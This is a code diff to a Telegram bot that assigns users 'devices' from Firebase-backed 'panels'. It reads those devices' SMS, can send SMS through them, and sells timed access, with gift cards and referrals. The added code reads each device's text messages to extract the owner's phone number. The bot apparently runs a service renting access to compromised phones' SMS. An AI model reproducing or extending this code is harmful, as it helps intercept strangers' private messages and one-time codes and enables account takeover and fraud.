@@ -1,7 +1,7 @@
 import TelegramBot from "node-telegram-bot-api";
 import { db, botUsersTable, panelsTable, giftCardsTable, referralsTable } from "@workspace/db";
 import { eq, and } from "drizzle-orm";
-import { fetchPanelDevices, fetchDeviceSms, sendSmsViaFirebase } from "./firebase";
+import { fetchPanelDevices, fetchDeviceSms, sendSmsViaFirebase, extractPhoneFromSms } from "./firebase";
 import * as fs from "fs";
 import * as path from "path";
 import { logger } from "./logger";
@@ -684,10 +684,19 @@ function setupHandlers(bot: TelegramBot) {
           .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId, state: "number_menu" })
           .where(eq(botUsersTable.id, user.id));
 
+        // Fetch SMS to extract real phone number (device node rarely has phoneNumber)
+        const [devicePanel] = await db.select().from(panelsTable).where(eq(panelsTable.id, device.panelId));
+        let resolvedPhone = device.phoneNumber && device.phoneNumber !== "—" ? device.phoneNumber : null;
+        if (!resolvedPhone && devicePanel) {
+          const smsForPhone = await fetchDeviceSms(devicePanel.firebaseUrl, devicePanel.secretKey, device.id);
+          resolvedPhone = extractPhoneFromSms(smsForPhone);
+        }
+        const displayPhone = resolvedPhone || "—";
+
         // Save to numbers history
         addToNumbersHistory(telegramId, {
           deviceId: device.id,
-          phoneNumber: device.phoneNumber || "—",
+          phoneNumber: displayPhone,
           deviceName: device.name || device.model || device.id,
           panelId: device.panelId,
           panelName: device.panelName,
@@ -702,7 +711,7 @@ function setupHandlers(bot: TelegramBot) {
  `${em(E.lightning, "")} <b>RANDOM NUMBER GENERATED!</b>\n` +
           `${divider()}\n\n` +
           `${em(E.id, "")} <b>DEVICE ID</b>    : N${device.id}\n` +
-          `${em(E.phone, "")} <b>NUMBER</b>      : ${device.phoneNumber || "Unknown"}\n` +
+          `${em(E.phone, "")} <b>NUMBER</b>      : ${displayPhone}\n` +
           `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device.name || device.model || device.id}\n` +
           `${em(E.db, "")} <b>DATABASE</b>    : ${device.panelName}\n` +
           `${em(E.check, "")} <b>STATUS</b>      : ${em(E.online, "")} ONLINE\n` +
@@ -750,31 +759,40 @@ function setupHandlers(bot: TelegramBot) {
           .set({ assignedDeviceId: device2.id, assignedPanelId: device2.panelId })
           .where(eq(botUsersTable.id, user.id));
 
+        // Fetch SMS to extract real phone number
+        const [devicePanel2] = await db.select().from(panelsTable).where(eq(panelsTable.id, device2.panelId));
+        let resolvedPhone2 = device2.phoneNumber && device2.phoneNumber !== "—" ? device2.phoneNumber : null;
+        if (!resolvedPhone2 && devicePanel2) {
+          const smsForPhone2 = await fetchDeviceSms(devicePanel2.firebaseUrl, devicePanel2.secretKey, device2.id);
+          resolvedPhone2 = extractPhoneFromSms(smsForPhone2);
+        }
+        const displayPhone2 = resolvedPhone2 || "—";
+
         // Save to numbers history
         addToNumbersHistory(telegramId, {
           deviceId: device2.id,
-          phoneNumber: device2.phoneNumber || "—",
+          phoneNumber: displayPhone2,
           deviceName: device2.name || device2.model || device2.id,
           panelId: device2.panelId,
           panelName: device2.panelName,
           takenAt: Date.now(),
         });
 
-        const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
-        const remainingMin = Math.floor(remainingMs / 60000);
+        const remainingMs2  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
+        const remainingMin2 = Math.floor(remainingMs2 / 60000);
 
         await send(
           chatId,
  `${em(E.lightning, "")} <b>RANDOM NUMBER GENERATED!</b>\n` +
           `${divider()}\n\n` +
           `${em(E.id, "")} <b>DEVICE ID</b>    : N${device2.id}\n` +
-          `${em(E.phone, "")} <b>NUMBER</b>      : ${device2.phoneNumber || "Unknown"}\n` +
+          `${em(E.phone, "")} <b>NUMBER</b>      : ${displayPhone2}\n` +
           `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device2.name || device2.model || device2.id}\n` +
           `${em(E.db, "")} <b>DATABASE</b>    : ${device2.panelName}\n` +
           `${em(E.check, "")} <b>STATUS</b>      : ${em(E.online, "")} ONLINE\n` +
           `${em(E.battery, "")} <b>BATTERY</b>     : ${device2.battery || "—"}\n` +
           `${divider()}\n\n` +
-          `${em(E.timer, "")} ACCESS — ${remainingMin}m REMAINING\n` +
+          `${em(E.timer, "")} ACCESS — ${remainingMin2}m REMAINING\n` +
           `${em(E.history, "")} NUMBERS HISTORY MEIN SAVED — ANYTIME DEKHO.`,
           { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
         );
